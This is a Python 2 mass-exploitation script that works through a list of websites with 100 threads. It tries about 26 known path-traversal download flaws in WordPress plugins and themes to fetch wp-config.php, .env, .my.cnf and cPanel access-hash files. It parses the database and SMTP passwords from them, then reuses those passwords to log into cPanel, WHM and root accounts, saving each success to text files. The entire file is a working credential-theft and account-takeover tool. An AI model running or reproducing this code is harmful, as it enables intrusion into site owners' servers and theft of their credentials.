import  re , sys , requests , socket , subprocess
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA



try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
requests.urllib3.disable_warnings()



def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  is not '/' :
        site = site+'/'
    return site

def domain(site):
	while site[-1] == "/":
		pattern = re.compile('(.*)/')
		sitez = re.findall(pattern,site)
		site = sitez[0]
	if site.startswith("http://") :
		site = site.replace("http://","")
	elif site.startswith("https://") :
		site = site.replace("https://","")
	else :
		pass
	return site

def cmdWP(host,user,passwd,db,fix):
	try:
		payload = 'php dbwp.php "{}" "{}" "{}" "{}" "{}"'.format(host,user,passwd,db,fix)
		ktn0 = subprocess.check_output(payload, shell=True);
		return ktn0
		pass
	except:
		pass
	pass

def wordpress(url,dom) :
    try:
        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        }
        pathes = [
             '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=cpabc_appointments_calendar_update&cpabc_calendar_update=1&id=../../../../../../wp-config.php',
             '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes',
             '/wp-admin/admin.php?page=multi_metabox_listing&action=edit&id=../../../../../../wp-config.php',
             '/wp-content/force-download.php?file=../wp-config.php',
             '/force-download.php?file=wp-config.php',
             '/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php',
             '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&file=../../../../wp-config.php',
             '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
             '/wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=../../wp-config.php',
             '/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=../../../../wp-config.php',
             '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
             '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../wp-config.php',
             '/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php',
             '/wp-content/plugins/tera-charts/charts/treemap.php?fn=../../../../wp-config.php',
             '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
             '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
             '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php',
             '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?path=../../../../../wp-config.php',
             '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php',
             '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
             '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
             '/wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php']
        for path in pathes:
            try:
                inj = url + path
                check_inj = requests.get(inj,headers=headers, allow_redirects=True, timeout=15).content
                if 'DB_PASSWORD' in check_inj:
                    print' -| ' + url + '--> {}[Revslider]'.format(fg)
                    Gethost = re.findall("'DB_HOST', '(.*)'", check_inj)
                    Getuser = re.findall("'DB_USER', '(.*)'", check_inj)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", check_inj)
                    Getdb = re.findall("'DB_NAME', '(.*)'", check_inj)
                    Getfix = re.findall("table_prefix  = '(.*)'", check_inj)
                    open('db-wordpress.txt', 'a').write(' URL : '+url+'\n Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +'\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[0] + '\n' + ' Fix:   ' + Getfix[0] + '\n---------------------\n')
                    if 'localhost' not in Gethost[0] and '127.0.0.1' not in Gethost[0] and '.' in Gethost[0] :
                        try :
                            cmdWP(Gethost[0], Getuser[0],Getpass[0], Getdb[0], Getfix[0])
                        except:
                            pass
                    else :
                        try :
                            ip = socket.gethostbyname(dom)
                            cmdWP(ip, Getuser[0],Getpass[0], Getdb[0], Getfix[0])
                        except:
                            pass
                    try:
                        checkcp = requests.get('https://' + dom + ':2083/login/',headers=headers, timeout=30).content
                    except:
                        try :
                            requests.packages.urllib3.disable_warnings()
                            checkcp = requests.get('https://' + dom + ':2083/login/',headers=headers, verify=False, timeout=30).content
                        except:
                            checkcp = 'xxxxxxxx'
                            pass
                    if 'cPanel' in checkcp :
                        passwords = []
                        passwords.append(Getpass[0])
                        req = requests.session()
                        if '%2F' in inj :
                            inj_mycnf = inj.replace('wp-config.php', '..%2F.my.cnf')
                            inj_accesshash = inj.replace('wp-config.php', '..%2F.accesshash')
                            inj_username = inj.replace('wp-config.php', '..%2F.cpanel%2Fdatastore%2Fftp_LISTSTORE')
                        else :
                            inj_mycnf = inj.replace('wp-config.php','../.my.cnf')
                            inj_accesshash = inj.replace('wp-config.php', '../.accesshash')
                            inj_username = inj.replace('wp-config.php', '../.cpanel/datastore/ftp_LISTSTORE')
                        ini_env = inj.replace('wp-config.php', '.env')
                        check_inj_mycnf = requests.get(inj_mycnf, timeout=15).content
                        check_inj_accesshash = requests.get(inj_accesshash, timeout=15).content
                        check_inj_username = requests.get(inj_username, timeout=15).content
                        check_ini_env = requests.get(ini_env, timeout=15).content
                        if 'MAIL_HOST' in check_ini_env:
                            SMTP_env = re.findall('MAIL_HOST=(.*)', check_ini_env)[0]
                            PORT_env = re.findall('MAIL_PORT=(.*)', check_ini_env)[0]
                            USERNAME_env = re.findall('MAIL_USERNAME=(.*)', check_ini_env)[0]
                            PASSWORD_env = re.findall('MAIL_PASSWORD=(.*)', check_ini_env)[0]
                            if '"' in SMTP_env :
                                SMTP_env = SMTP_env.replace('"', '')
                            if '"' in PORT_env :
                                PORT_env = PORT_env.replace('"', '')
                            if '"' in USERNAME_env :
                                USERNAME_env = USERNAME_env.replace('"', '')
                            if '"' in PASSWORD_env :
                                PASSWORD_env = PASSWORD_env.replace('"', '')
                            if 'null' not in PASSWORD_env :
                                passwords.append(PASSWORD_env)
                            if 'null' not in PASSWORD_env and PASSWORD_env != '' :
                                passwords.append(PASSWORD_env)
                            if "smtp.mailtrap.io" not in SMTP_env and "mailtrap.io" not in SMTP_env and "gmail.com" not in SMTP_env and 'localhost' not in SMTP_env and 'null' not in SMTP_env and 'null' not in PASSWORD_env and PASSWORD_env != '':
                                print ' -| ' + url + '--> {}[SMTP]'.format(fg)
                                open('SMTPs-env.txt', 'a').write(SMTP_env + '|'+PORT_env+'|'+USERNAME_env+'|'+PASSWORD_env+'\n')
                        elif 'SMTP_HOST' in check_ini_env:
                            SMTP_env = re.findall('SMTP_HOST=(.*)', check_ini_env)[0]
                            PORT_env = re.findall('SMTP_PORT=(.*)', check_ini_env)[0]
                            USERNAME_env = re.findall('SMTP_USERNAME=(.*)', check_ini_env)[0]
                            PASSWORD_env = re.findall('SMTP_PASSWORD=(.*)', check_ini_env)[0]
                            if '"' in SMTP_env :
                                SMTP_env = SMTP_env.replace('"', '')
                            if '"' in PORT_env :
                                PORT_env = PORT_env.replace('"', '')
                            if '"' in USERNAME_env :
                                USERNAME_env = USERNAME_env.replace('"', '')
                            if '"' in PASSWORD_env :
                                PASSWORD_env = PASSWORD_env.replace('"', '')
                            if 'null' not in PASSWORD_env :
                                passwords.append(PASSWORD_env)
                            if 'null' not in PASSWORD_env and PASSWORD_env != '' :
                                passwords.append(PASSWORD_env)
                            if "smtp.mailtrap.io" not in SMTP_env and "mailtrap.io" not in SMTP_env and "gmail.com" not in SMTP_env and 'localhost' not in SMTP_env and 'null' not in SMTP_env and 'null' not in PASSWORD_env and PASSWORD_env != '':
                                print ' -| ' + url + '--> {}[SMTP]'.format(fg)
                                open('SMTPs-env.txt', 'a').write(SMTP_env + '|'+PORT_env+'|'+USERNAME_env+'|'+PASSWORD_env+'\n')
                        if 'DB_PASSWORD' in check_ini_env:
                            DB_PASSWORD = re.findall('DB_PASSWORD=(.*)', check_ini_env)[0]
                            if '"' in DB_PASSWORD :
                                DB_PASSWORD = DB_PASSWORD.replace('"', '')
                            if 'null' not in DB_PASSWORD :
                                passwords.append(DB_PASSWORD)
                            if "DB_USERNAME=root" in check_ini_env :
                                ROOTU = re.findall('DB_USERNAME=(.*)', check_ini_env)[0]
                                ROOTP = re.findall('DB_PASSWORD=(.*)', check_ini_env)[0]
                                if '"' in ROOTU:
                                    ROOTU = ROOTU.replace('"', '')
                                if '"' in ROOTP:
                                    ROOTP = ROOTP.replace('"', '')
                                if 'null' not in ROOTP and ROOTP != '' :
                                    print ' -| ' + url + '--> {}[ROOT/env]'.format(fg)
                                    open('DB-Roots-env.txt', 'a').write(dom + '|root|' + ROOTP + '\n')
                        if re.findall('password="(.*)"', check_inj_mycnf) :
                            passwd = re.findall('password="(.*)"', check_inj_mycnf)[0]
                            passwords.append(passwd)
                        elif re.findall('password=(.*)', check_inj_mycnf) :
                            passwd = re.findall('password=(.*)', check_inj_mycnf)[0]
                            passwords.append(passwd)
                        if re.findall('"user":"(.*)_logs"', check_inj_username) :
                            while re.findall('"user":"(.*)_logs"', check_inj_username):
                                check_inj_username = re.findall('"user":"(.*)_logs"', check_inj_username)[0]
                            username = str(check_inj_username)
                            username = username.split('"', 1)[0]
                        elif '_' in Getuser[0] :
                            username = re.findall("(.*)_", Getuser[0])[0]
                        else :
                            username = Getuser[0]
                        if check_inj_accesshash != '' and 'empty' not in check_inj_accesshash and '<' not in check_inj_accesshash and '>' not in check_inj_accesshash and 'Site currently under maintenance' not in check_inj_accesshash and 'file transfer failed' not in check_inj_accesshash:
                            print ' -| ' + url + '--> {}[accesshash]'.format(fg)
                            open('WHM-accesshash.txt', 'a').write('https://' + dom + ':2087\n' + username + '|\n'+check_inj_accesshash+'\n-------------------------------------\n')
                        for password in passwords:
                            postlogin = {'user': username, 'pass': password, 'login_submit': 'Log in'}
                            try:
                                login = req.post('https://' + dom + ':2083/login/',headers=headers, data=postlogin, timeout=30)
                            except:
                                requests.packages.urllib3.disable_warnings()
                                login = req.post('https://' + dom + ':2083/login/',headers=headers, verify=False, data=postlogin,timeout=30)
                            if 'filemanager' in login.content:
                                print ' -| ' + url + '--> {}[cPanel]'.format(fg)
                                open('cPanels.txt', 'a').write('https://' + dom + ':2083|'+username+'|'+password+'\n')
                                postloginWHM = {'user': username, 'pass': password, 'login_submit': 'Log in'}
                                postloginRoot = {'user': 'root', 'pass': password, 'login_submit': 'Log in'}
                                try:
                                    loginWHM = req.post('https://' + dom + ':2087/login/',headers=headers, data=postloginWHM, timeout=30)
                                except:
                                    requests.packages.urllib3.disable_warnings()
                                    loginWHM = req.post('https://' + dom + ':2087/login/',headers=headers, verify=False, data=postloginWHM,timeout=30)
                                if 'Account Functions' in loginWHM.content :
                                    print ' -| ' + url + '--> {}[Reseller]'.format(fg)
                                    open('Resellers.txt', 'a').write('https://' + dom + ':2087|'+username+'|'+password+'\n')
                                try:
                                    loginRoot = req.post('https://' + dom + ':2087/login/',headers=headers, data=postloginRoot, timeout=30)
                                except:
                                    requests.packages.urllib3.disable_warnings()
                                    loginRoot = req.post('https://' + dom + ':2087/login/',headers=headers, verify=False, data=postloginRoot,timeout=30)
                                if 'Account Functions' in loginRoot.content :
                                    print ' -| ' + url + '--> {}[Root]'.format(fg)
                                    open('roots.txt', 'a').write('https://' + dom + ':2087|root|' + password + '\n')
                    break
                else :
                    print' -| ' + url + '--> {}[NotVulnRevslider]'.format(fr)
            except:
                print' -| ' + url + '--> {}[NotVulnRevslider]'.format(fr)
    except :
        print' -| ' + url + '--> {}[NotVulnRevslider]'.format(fr)
def wordpressCMD(url) :
    try :
        dom = domain(url)
        url = URLdomain(url)
        try:
            socket.gethostbyname(dom)
        except:
            print ' -| ' + url + ' --> {}[DomainNotwork]'.format(fr)
            return
        wordpress(url, dom)
    except:
        pass

mp = Pool(100)
mp.map(wordpressCMD, target)
mp.close()
mp.join()